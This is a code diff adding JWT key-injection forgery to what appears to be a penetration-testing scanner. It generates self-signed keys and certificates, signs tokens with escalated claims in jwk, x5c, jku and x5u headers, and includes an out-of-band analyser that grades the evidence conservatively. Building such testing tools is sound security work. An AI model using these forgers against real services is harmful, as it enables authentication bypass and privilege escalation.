@@ -133,6 +133,9 @@ and these two checks are structurally `not_tested` off-lab today.
 """
 from __future__ import annotations
 
+import base64
+import datetime
+import hashlib
 import json
 import re
 import time
@@ -650,6 +653,284 @@ def forge_with_secret(token: str, secret: str, overrides: dict = None) -> Forged
         token="%s.%s.%s" % (hb, pb, jwt_tool.sign_hs(hb + "." + pb, secret, alg)),
         rationale=("a fully valid token with escalated claims, signed with the recovered secret -- "
                    "it is cryptographically indistinguishable from one the server issued"))
+
+
+# ------------------------------------------------------------------------------------------------
+# attacker-supplied key material: self-signed JWK / x5c, and the jku / x5u remote-fetch shapes
+#
+# All four are the same defect wearing four hats -- THE VERIFIER TAKES ITS KEY FROM THE TOKEN. They
+# differ only in how far the key travels: inside the header (`jwk`, `x5c`) or behind a URL in the
+# header (`jku`, `x5u`). The two embedded shapes are confirmable in band; the two URL shapes are
+# NOT, and this module says so rather than inventing an oracle for them.
+#
+# The key is generated fresh per call and never persisted, so nothing here can be mistaken for a
+# real credential: the private half exists only inside the process that forged the token.
+# ------------------------------------------------------------------------------------------------
+
+#: Certificate validity is FIXED, not clock-derived, so a forged cert is byte-reproducible and a
+#: test can check it. A server that trusts a certificate it fetched from a URL the token supplied
+#: is not, in practice, checking notBefore/notAfter -- and if it does, the window below spans any
+#: realistic engagement. The caller can override both.
+_CERT_NOT_BEFORE = datetime.datetime(2020, 1, 1, tzinfo=datetime.timezone.utc)
+_CERT_NOT_AFTER = datetime.datetime(2035, 1, 1, tzinfo=datetime.timezone.utc)
+_CERT_COMMON_NAME = "apolaki-forged-key"
+
+_RS_ALGS = {"RS256": "SHA256", "RS384": "SHA384", "RS512": "SHA512"}
+
+
+@dataclass(frozen=True)
+class ForgeKey:
+    """A freshly generated RSA key pair used to sign forged tokens.
+
+    `kid` is the RFC 7638 JWK thumbprint of the public half rather than a random string: the same
+    key always produces the same `kid`, so the token header, the JWKS document served at the `jku`
+    URL and the test's expectations agree by construction instead of by wiring.
+    """
+    private: object
+    kid: str
+
+
+def generate_key(bits: int = 2048) -> ForgeKey:
+    """A synthetic RSA key pair. The private half lives only in this process."""
+    from cryptography.hazmat.primitives.asymmetric import rsa
+    private = rsa.generate_private_key(public_exponent=65537, key_size=int(bits))
+    return ForgeKey(private=private, kid=jwk_thumbprint(_public_jwk_core(private)))
+
+
+def _public_jwk_core(private) -> dict:
+    """The three RFC 7638 thumbprint members, and nothing else."""
+    nums = private.public_key().public_numbers()
+    return {"e": jwt_tool.b64url_encode(nums.e.to_bytes((nums.e.bit_length() + 7) // 8, "big")),
+            "kty": "RSA",
+            "n": jwt_tool.b64url_encode(nums.n.to_bytes((nums.n.bit_length() + 7) // 8, "big"))}
+
+
+def jwk_thumbprint(core: dict) -> str:
+    """RFC 7638: base64url(SHA-256(canonical JSON of the required members, keys sorted))."""
+    canonical = json.dumps({k: core[k] for k in ("e", "kty", "n")},
+                           separators=(",", ":"), sort_keys=True)
+    return jwt_tool.b64url_encode(hashlib.sha256(canonical.encode()).digest())
+
+
+def public_jwk(key: ForgeKey, alg: str = "RS256") -> dict:
+    jwk = dict(_public_jwk_core(key.private))
+    jwk.update({"use": "sig", "alg": alg, "kid": key.kid})
+    return jwk
+
+
+def jwks_document(key: ForgeKey, alg: str = "RS256") -> str:
+    """The JSON Web Key Set to serve at the `jku` URL. Parseable by `jwt_tool.first_rsa_pem`,
+    which is the same reader Apolaki uses against a real target's JWKS -- so the document this
+    builds is known-good against the tree's own consumer, not only against itself."""
+    return json.dumps({"keys": [public_jwk(key, alg)]}, separators=(",", ":"), sort_keys=True)
+
+
+def _certificate(key: ForgeKey, common_name: str = _CERT_COMMON_NAME,
+                 not_before: datetime.datetime = _CERT_NOT_BEFORE,
+                 not_after: datetime.datetime = _CERT_NOT_AFTER):
+    from cryptography import x509
+    from cryptography.hazmat.primitives import hashes
+    from cryptography.x509.oid import NameOID
+    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, common_name)])
+    # Deterministic per key, unique across keys: 120 bits off the thumbprint, forced odd-positive.
+    serial = int.from_bytes(hashlib.sha256(key.kid.encode()).digest()[:15], "big") | 1
+    return (x509.CertificateBuilder()
+            .subject_name(name).issuer_name(name)
+            .public_key(key.private.public_key())
+            .serial_number(serial)
+            .not_valid_before(not_before).not_valid_after(not_after)
+            .sign(key.private, hashes.SHA256()))
+
+
+def self_signed_cert_pem(key: ForgeKey, common_name: str = _CERT_COMMON_NAME) -> str:
+    """The PEM certificate to serve at the `x5u` URL."""
+    from cryptography.hazmat.primitives import serialization
+    return _certificate(key, common_name).public_bytes(serialization.Encoding.PEM).decode()
+
+
+def _x5c_entry(key: ForgeKey, common_name: str = _CERT_COMMON_NAME) -> str:
+    """RFC 7515 x5c: STANDARD base64 (not base64url) of the DER certificate."""
+    from cryptography.hazmat.primitives import serialization
+    der = _certificate(key, common_name).public_bytes(serialization.Encoding.DER)
+    return base64.b64encode(der).decode()
+
+
+def sign_rs(signing_input: str, key: ForgeKey, alg: str = "RS256") -> str:
+    """RSASSA-PKCS1-v1_5 over the signing input. `''` for an algorithm this does not implement --
+    validated against `_RS_ALGS` rather than caught, so an unsupported name is a value, not an
+    exception path."""
+    name = _RS_ALGS.get(str(alg).upper())
+    if not name:
+        return ""
+    from cryptography.hazmat.primitives import hashes
+    from cryptography.hazmat.primitives.asymmetric import padding
+    digest = getattr(hashes, name)()
+    return jwt_tool.b64url_encode(
+        key.private.sign(signing_input.encode(), padding.PKCS1v15(), digest))
+
+
+def _forge_asymmetric(token: str, header_extra: dict, key: ForgeKey, overrides: dict,
+                      alg: str = "RS256") -> tuple:
+    """`(token, claims)` for a properly RS-signed forgery, or `('', {})` if the input will not
+    decode. The header keeps only `typ`: carrying the original `kid` forward would point the
+    verifier at the SERVER's key, which is the opposite of the attack."""
+    d = jwt_tool.decode_jwt(token)
+    if not d:
+        return "", {}
+    header = {"typ": str(d["header"].get("typ", "JWT")) or "JWT", "alg": alg, "kid": key.kid}
+    header.update(header_extra)
+    claims = escalated_claims(d["payload"], overrides)
+    hb, pb = _encode(header, claims)
+    signature = sign_rs(hb + "." + pb, key, alg)
+    if not signature:
+        return "", {}
+    return "%s.%s.%s" % (hb, pb, signature), claims
+
+
+def forge_self_signed_jwk(token: str, key: ForgeKey, overrides: dict = None) -> ForgedToken | None:
+    """Burp's `self-signed JWK header supported`: the public half of OUR key rides in the `jwk`
+    header and the token is signed with the private half. A verifier that takes the key from the
+    token validates it perfectly."""
+    forged, _ = _forge_asymmetric(token, {"jwk": public_jwk(key)}, key, overrides)
+    if not forged:
+        return None
+    return ForgedToken(
+        check=CHECK_SELF_SIGNED_JWK, shape="jwk_embedded", token=forged,
+        rationale=("the token carries the public half of a key generated here and is signed with "
+                   "the private half; it verifies flawlessly against the key it supplies"))
+
+
+def forge_self_signed_x5c(token: str, key: ForgeKey, overrides: dict = None) -> ForgedToken | None:
+    """The certificate-shaped sibling of the JWK attack: a self-signed X.509 in the `x5c` header.
+    Same defect (key material taken from the token), different container -- a verifier can reject
+    `jwk` and still trust `x5c`, so the two are separate probes rather than one."""
+    forged, _ = _forge_asymmetric(token, {"x5c": [_x5c_entry(key)]}, key, overrides)
+    if not forged:
+        return None
+    return ForgedToken(
+        check=CHECK_SELF_SIGNED_JWK, shape="x5c_embedded", token=forged,
+        rationale=("the token carries a self-signed certificate in x5c and is signed with that "
+                   "certificate's private key"))
+
+
+def forge_jku(token: str, jku_url: str, key: ForgeKey, overrides: dict = None) -> ForgedToken | None:
+    """Burp's `arbitrary jku header supported`. The token is worthless without the JWKS document
+    in `side_channel` being reachable at `side_channel_url`: `requires_oob` is True and a caller
+    that cannot serve it must record `not_tested` rather than send the token."""
+    if not str(jku_url or "").strip():
+        return None
+    forged, _ = _forge_asymmetric(token, {"jku": jku_url}, key, overrides)
+    if not forged:
+        return None
+    return ForgedToken(
+        check=CHECK_ARBITRARY_JKU, shape="jku_remote_jwks", token=forged,
+        rationale=("the jku header points at a key set we host; the kid in the header is the RFC "
+                   "7638 thumbprint of the key in that document, so a verifier that fetches and "
+                   "looks up by kid finds our key"),
+        requires_oob=True, side_channel=jwks_document(key), side_channel_url=jku_url)
+
+
+def forge_x5u(token: str, x5u_url: str, key: ForgeKey, overrides: dict = None) -> ForgedToken | None:
+    """Burp's `arbitrary x5u header supported`. Same shape as `jku` with a PEM certificate as the
+    side channel instead of a key set."""
+    if not str(x5u_url or "").strip():
+        return None
+    forged, _ = _forge_asymmetric(token, {"x5u": x5u_url}, key, overrides)
+    if not forged:
+        return None
+    return ForgedToken(
+        check=CHECK_ARBITRARY_X5U, shape="x5u_remote_certificate", token=forged,
+        rationale=("the x5u header points at a self-signed certificate we host, and the token is "
+                   "signed with that certificate's private key"),
+        requires_oob=True, side_channel=self_signed_cert_pem(key), side_channel_url=x5u_url)
+
+
+# ------------------------------------------------------------------------------------------------
+# the OOB-gated analyser for jku / x5u
+# ------------------------------------------------------------------------------------------------
+
+_FETCHED_CHECK = {CHECK_ARBITRARY_JKU: CHECK_JKU_FETCHED, CHECK_ARBITRARY_X5U: CHECK_X5U_FETCHED}
+_HEADER_NAME = {CHECK_ARBITRARY_JKU: "jku", CHECK_ARBITRARY_X5U: "x5u"}
+
+
+def correlated_interactions(interactions: list, oob_token: str = "") -> list:
+    """Interactions attributable to THIS probe.
+
+    `collaborator.hits(token)` is already keyed by token, so with no `oob_token` the list is taken
+    as given. When one IS supplied the path and Host are re-checked against it, because a
+    collaborator shared across a mission will hold callbacks from other probes and a jku
+    confirmation built on someone else's callback is a fabricated one.
+    """
+    rows = [i for i in (interactions or []) if isinstance(i, dict)]
+    if not oob_token:
+        return rows
+    return [i for i in rows
+            if oob_token in str(i.get("path", "")) or oob_token in str(i.get("host", ""))]
+
+
+def analyze_remote_key_header(check: str, controls: Controls, forged: Response,
+                              oob_available: bool, oob_interactions: list,
+                              oob_token: str = "", shape: str = "", payload: str = "") -> dict:
+    """`jku` / `x5u`, where the only proof of the fetch is out of band.
+
+    THE LADDER, and it refuses to conflate two different facts the way `code_injection` refuses to
+    name a language off shared arithmetic:
+
+      no collaborator        -> not_tested. There is no in-band oracle for a remote key fetch and
+                                this module does not invent one.
+      fetched AND accepted   -> the key was TRUSTED. CWE-347, critical.
+      fetched, not accepted  -> the server made an attacker-steered outbound request and that is
+                                all that is proven. Reported as the FETCHED check, CWE-918,
+                                medium. It is NOT upgraded to a forgery.
+      accepted, NOT fetched  -> a CONTRADICTION. If the server never fetched our key it cannot
+                                have verified with it, so the acceptance came from somewhere else
+                                and nothing is claimed.
+      neither                -> rejected for this probe. The reason states that a missing callback
+                                inside the poll window is not proof the server refused.
+    """
+    header = _HEADER_NAME.get(check, "jku")
+    if not oob_available:
+        return {"check": check, "verdict": VERDICT_NOT_TESTED, "shape": shape, "evidence": "",
+                "reason": ("no out-of-band collaborator is reachable from this target, and a %s "
+                           "forgery is confirmed only by the server FETCHING the attacker URL -- "
+                           "there is no in-band oracle for it, so this check did not run" % header)}
+
+    hits = correlated_interactions(oob_interactions, oob_token)
+    acceptance = analyze_forgery(check, controls, forged, shape=shape, payload=payload)
+
+    if hits and acceptance["verdict"] == VERDICT_CONFIRMED:
+        first = hits[0]
+        return {"check": check, "verdict": VERDICT_CONFIRMED, "shape": shape,
+                "evidence": ("%s -- and the target fetched the key material itself: %s request "
+                             "from %s for %s" % (acceptance["evidence"],
+                                                 first.get("method", "HTTP"),
+                                                 first.get("source_ip", "the target"),
+                                                 first.get("path", "the collaborator URL"))),
+                "reason": acceptance["reason"]}
+
+    if hits:
+        first = hits[0]
+        return {"check": _FETCHED_CHECK.get(check, check), "verdict": VERDICT_CONFIRMED,
+                "shape": shape,
+                "evidence": ("the target made an outbound %s request from %s for %s after being "
+                             "sent a token whose %s header named that URL; the acceptance test "
+                             "separately returned '%s', so the fetch is proven and trust is not"
+                             % (first.get("method", "HTTP"), first.get("source_ip", "the target"),
+                                first.get("path", "the collaborator URL"), header,
+                                acceptance["verdict"])),
+                "reason": ("the fetch is proven by a correlated out-of-band interaction; the key "
+                           "was not shown to be trusted (%s)" % acceptance["reason"])}
+
+    if acceptance["verdict"] == VERDICT_CONFIRMED:
+        return {"check": check, "verdict": VERDICT_NOT_TESTED, "shape": shape, "evidence": "",
+                "reason": ("the forged token was accepted but the target never fetched the key "
+                           "material, so it cannot have verified with our key -- the acceptance "
+                           "was produced by something else and this check claims nothing")}
+
+    return {"check": check, "verdict": acceptance["verdict"], "shape": shape, "evidence": "",
+            "reason": ("no correlated out-of-band interaction arrived: the target did not fetch "
+                       "the %s URL within the poll window, which is not proof that it refused it. "
+                       "%s" % (header, acceptance["reason"]))}
 
 
 # ------------------------------------------------------------------------------------------------
